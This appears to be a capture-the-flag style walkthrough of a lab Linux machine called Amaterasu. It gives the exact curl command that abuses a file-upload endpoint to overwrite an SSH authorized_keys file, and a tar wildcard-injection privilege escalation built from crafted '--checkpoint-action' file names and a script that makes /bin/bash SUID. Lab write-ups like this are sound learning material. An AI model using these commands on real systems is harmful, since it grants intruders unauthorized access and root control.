# 🏴 Amaterasu (Linux)

## 🧠 Initial Foothold

- Discovered an HTTP service on port 33414.

- Ran `dirb` and found an `/info` endpoint that accepted POST requests with file uploads.

- Used this endpoint to upload a public SSH key and overwrite the `authorized_keys` file for the `alfredo` user:
  ```bash
  curl -i -X POST "http://192.168.163.249:33414/file-upload" -F "file=@authorized_keys.txt" -F "filename=/home/alfredo/.ssh/authorized_keys"
  ```

- Successfully gained SSH access as `alfredo`.

---

## 🚀 Privilege Escalation

- Executed `pspy32s` and `linpeas.sh` for process and privilege escalation enumeration.

- Found a cron job running every minute as root:
  ```cron
  * * * * * root /usr/bin/local/mysql-db-backup.sh
  ```

- Inspected the script:
  ```bash
  #!/bin/bash
  cd /home/alfredo/restapi/
  tar czf /tmp/dbbackup.tar.gz *
  ```

- Abused the tar wildcard injection vulnerability by creating malicious files in the restapi directory:
  ```bash
  echo "#!/bin/bash" > priv.sh
  echo "chmod +s /bin/bash" >> priv.sh
  chmod +x priv.sh
  touch -- '--checkpoint=1'
  touch -- '--checkpoint-action=exec=sh priv.sh'
  ```

- Waited for the cron job to execute.

- Obtained a root shell with:
  ```bash
  /bin/bash -p
  id && whoami
  ```

---

🧼 **Post-Exploitation Note:**  
Revert sticky-bit shell if left behind and disable cron persistence if applicable.

> ⚠️ This walkthrough is for educational purposes only.
